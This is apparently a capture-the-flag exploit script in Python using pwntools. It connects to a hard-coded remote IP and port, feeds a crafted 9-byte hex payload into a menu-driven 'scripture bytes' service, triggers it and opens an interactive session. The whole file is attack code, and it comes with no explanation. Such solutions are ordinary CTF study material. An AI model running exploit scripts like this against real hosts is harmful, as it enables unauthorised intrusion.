from pwn import *

context.log_level = "info"

p = remote("134.112.58.12",31340)

payload = bytes.fromhex(
    "30 01 00 90"  
    "40 01 00 88"  
    "60"           
)
assert len(payload) == 9
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"length: ", str(len(payload)).encode())
p.sendlineafter(b"scripture bytes (hex): ", payload.hex().encode())
p.sendlineafter(b"> ", b"3")
p.interactive()